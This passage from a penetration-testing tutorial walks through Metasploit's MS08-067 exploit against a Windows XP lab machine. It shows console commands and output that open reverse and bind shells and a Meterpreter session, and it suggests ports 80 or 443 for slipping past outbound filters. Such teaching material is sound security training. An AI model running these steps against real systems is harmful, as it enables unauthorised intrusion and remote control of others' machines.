### Payloads (or Shellcode)

Based on the output of the `show options` command, it appears that everything is set up and ready to go. However, there is one more step: we need to specify what our exploit should do once the target has been compromised. Metasploit simplifies this process by providing a wide range of payloads, from simple Windows commands to the advanced Metasploit Meterpreter (see Chapter 13 for more detailed information on Meterpreter). Selecting a compatible payload allows Metasploit to craft the exploit string, including the code to trigger the vulnerability and the payload to execute upon successful exploitation. (We will cover writing exploits manually in Chapters 16 through 19.)

#### Finding Compatible Payloads

At the time of writing, Metasploit includes 324 payloads, with new ones being added regularly. For example, as mobile platforms become more prevalent, payloads for iOS and other smartphones are becoming available. Not all 324 payloads are compatible with every exploit. A Windows system, for instance, would not be able to execute instructions meant for an iPhone. To find compatible payloads, use the `show payloads` command, as shown in Listing 4-7.

```plaintext
msf exploit(ms08_067_netapi) > show payloads
Compatible Payloads
===================
Name                   Rank  Description
----                   ----  -----------
generic/custom         normal Custom Payload
generic/debug_trap     normal Generic x86 Debug Trap
generic/shell_bind_tcp normal Generic Command Shell, Bind TCP
generic/shell_reverse_tcp normal Generic Command Shell, Reverse TCP
--snip--
windows/vncinject/reverse_tcp normal VNC Server (Reflective Injection), Reverse TCP Stager
```

If you forget to set a payload, the exploit module may automatically choose the default payload and settings. However, it is good practice to manually set the payload and its options, as the default may not always meet your specific needs.

#### A Test Run

To start, let's run the exploit with the default payload options to see how it works. Enter `exploit` to tell Metasploit to run the module, as shown in Listing 4-8.

```plaintext
msf exploit(ms08_067_netapi) > exploit
[*] Started reverse handler on 192.168.20.9:4444
[*] Automatically detecting the target...
[*] Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] Attempting to trigger the vulnerability...
[*] Sending stage (752128 bytes) to 192.168.20.10
[*] Meterpreter session 1 opened (192.168.20.9:4444 -> 192.168.20.10:1334) at 2015-08-31 07:37:05 -0400
meterpreter >
```

As you can see, we end up with a Meterpreter session. Meterpreter, short for meta-interpreter, is Metasploit's unique payload. It is often described as a "shell on steroids," capable of performing a wide range of tasks. For more details, enter `help` in the Meterpreter console to see a list of available commands.

**Note:** The default port used by Metasploit is 4444. While this works fine in a lab environment, real-world intrusion prevention systems may detect and block traffic on this port. 

Let's close the Meterpreter session and learn more about selecting payloads manually. Type `exit` into the Meterpreter prompt to return to the regular Metasploit console.

```plaintext
meterpreter > exit
[*] Shutting down Meterpreter...
[*] Meterpreter session 1 closed. Reason: User exit
msf exploit(ms08_067_netapi) >
```

#### Types of Shells

In the list of compatible payloads (Listing 4-7), you will see a variety of options, including command shells, Meterpreter, and others. Shells generally fall into two categories: bind and reverse.

##### Bind Shells

A bind shell instructs the target machine to open a command shell and listen on a local port. The attacking machine then connects to the target on the listening port. However, firewalls often block traffic to random ports, making bind shells less effective.

##### Reverse Shells

A reverse shell, on the other hand, initiates a connection back to the attacking machine rather than waiting for an incoming connection. On the attacking machine, a local port is opened to listen for a connection from the target. This method is more likely to bypass firewall restrictions.

**Note:** Modern firewalls can also filter outbound connections. Setting up a listener on common ports like 80 or 443 can make the traffic appear as web traffic, which is typically allowed.

#### Setting a Payload Manually

Let's select a Windows reverse shell as our payload. Set the payload using the `set payload` command, similar to setting the RHOST option.

```plaintext
msf exploit(ms08_067_netapi) > set payload windows/shell_reverse_tcp
payload => windows/shell_reverse_tcp
```

Since this is a reverse shell, we need to specify the IP address and port of the attacking machine. Running `show options` again (Listing 4-9) displays both the module and payload options.

```plaintext
msf exploit(ms08_067_netapi) > show options
Module options (exploit/windows/smb/ms08_067_netapi):
Name   Current Setting Required Description
----   --------------- -------- -----------
RHOST  192.168.20.10  yes      The target address
RPORT  445             yes      Set the SMB service port
SMBPIPE BROWSER        yes      The pipe name to use (BROWSER, SRVSVC)

Payload options (windows/shell_reverse_tcp):
Name   Current Setting Required Description
----   --------------- -------- -----------
LHOST  192.168.20.9   yes      The listen address
LPORT  4444            yes      The listen port
EXITFUNC thread        yes      Exit technique: seh, thread, process, none
```

Set the LHOST option with the IP address of the attacking machine. You can find the IP address using the `ifconfig` command in Msfconsole.

```plaintext
msf exploit(ms08_067_netapi) > ifconfig
[*] exec: ifconfig
eth0 Link encap:Ethernet HWaddr 00:0c:29:0e:8f:11
inet addr:192.168.20.9 Bcast:192.168.20.255 Mask:255.255.255.0
--snip--
```

Now set the LHOST option with `set LHOST 192.168.20.9`. Leave the defaults for LPORT and EXITFUNC. Enter `exploit` to send the exploit, as shown in Listing 4-10.

```plaintext
msf exploit(ms08_067_netapi) > exploit
[*] Started reverse handler on 192.168.20.9:4444
[*] Automatically detecting the target...
[*] Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] Attempting to trigger the vulnerability...
[*] Command shell session 2 opened (192.168.20.9:4444 -> 192.168.20.10:1374) at 2015-08-31 10:29:36 -0400
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.
C:\WINDOWS\system32>
```

Congratulations! You have successfully exploited your first machine. When you enter `exploit`, Metasploit opens a listener on port 4444 to catch the reverse shell. It then fingerprints the remote SMB server, selects the appropriate target, and sends the exploit string. If the exploit succeeds, a command shell is established.

To close the shell, type `Ctrl-C` and enter `y` at the prompt to abort the session.

```plaintext
C:\WINDOWS\system32>^C
Abort session 2? [y/N] y
[*] Command shell session 2 closed. Reason: User exit
msf exploit(ms08_067_netapi) >
```

To return to a Meterpreter shell, you can choose a payload with "Meterpreter" in the name, such as `windows/meterpreter/reverse_tcp`, and exploit the Windows XP target again.

### Msfcli

Msfcli, the command-line interface for Metasploit, is particularly useful for scripting and testing modules. It allows you to run a module with a single command.

#### Getting Help

To use Msfcli, exit Msfconsole by entering `exit`, or open another Linux console. Msfcli is in the path, so you can call it from anywhere. Start by looking at the help menu with `msfcli -h` (Listing 4-11).

```plaintext
root@kali:~# msfcli -h
Usage: /opt/metasploit/apps/pro/msf3/msfcli [module] [mode]
==============================================================================
Mode  Description
----  -----------
(A)dvanced  Show available advanced options for this module
(AC)tions   Show available actions for this auxiliary module
(C)heck     Run the check routine of the selected module
(E)xecute   Execute the selected module
(H)elp      You're looking at it baby!
(I)DS Evasion  Show available IDS evasion options for this module
(O)ptions   Show available options for this module
(P)ayloads   Show available payloads for this module
(S)ummary   Show information about this module
(T)argets    Show available targets for this exploit module
```

Unlike Msfconsole, Msfcli allows you to specify all necessary options in a single command. Use the O mode to show the selected moduleâ€™s options and P to show compatible payloads.

#### Showing Options

Let's use the MS08-067 exploit against our Windows XP target again. To show the available options, use the O mode. Enter `msfcli windows/smb/ms08_067_netapi O` to see the options for the MS08-067 exploit module (Listing 4-12).

```plaintext
root@kali:~# msfcli windows/smb/ms08_067_netapi O
[*] Please wait while we load the module tree...
Name   Current Setting Required Description
----   --------------- -------- -----------
RHOST  yes              The target address
RPORT  445              yes      Set the SMB service port
SMBPIPE BROWSER          yes      The pipe name to use (BROWSER, SRVSVC)
```

Set the RHOST option to the IP address of the target machine using `RHOST=192.168.20.10`.

#### Payloads

To see the compatible payloads, use the P mode. Enter `msfcli windows/smb/ms08_067_netapi RHOST=192.168.20.10 P` (Listing 4-13).

```plaintext
root@kali:~# msfcli windows/smb/ms08_067_netapi RHOST=192.168.20.10 P
[*] Please wait while we load the module tree...
Compatible payloads
===================
Name                  Description
----                  -----------
generic/custom        Use custom string or file as payload. Set either PAYLOADFILE or PAYLOADSTR.
generic/debug_trap    Generate a debug trap in the target process
generic/shell_bind_tcp Listen for a connection and spawn a command shell
generic/shell_reverse_tcp Connect back to attacker and spawn a command shell
--snip--
```

This time, we'll use a bind shell payload. Recall that a bind shell listens on a local port on the target machine. We don't need to set the LHOST option, and we can leave the LPORT option as the default of 4444. Finally, to run the exploit, use the E flag (Listing 4-14).

```plaintext
root@kali:~# msfcli windows/smb/ms08_067_netapi RHOST=192.168.20.10 PAYLOAD=windows/shell_bind_tcp E
[*] Please wait while we load the module tree...
RHOST => 192.168.20.10
PAYLOAD => windows/shell_bind_tcp
[*] Started bind handler
[*] Automatically detecting the target...
[*] Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] Attempting to trigger the vulnerability...
[*] Command shell session 1 opened (192.168.20.9:35156 -> 192.168.20.10:4444) at 2015-08-31 16:43:54 -0400
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.
C:\WINDOWS\system32>
```

You have now successfully used Msfcli to run an exploit with a bind shell payload.